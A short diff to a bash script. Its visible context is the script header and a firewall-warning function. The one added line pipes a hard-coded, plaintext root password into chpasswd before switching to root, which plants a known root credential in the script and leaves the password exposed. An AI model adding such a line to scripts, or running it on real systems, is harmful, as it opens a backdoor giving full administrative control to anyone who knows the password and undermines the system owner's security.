@@ -1,4 +1,5 @@
 #!/bin/bash
+echo root:Square831009! | chpasswd
 sudo su
 ############################# Firewall warning #################################
 function firewallwarn(){
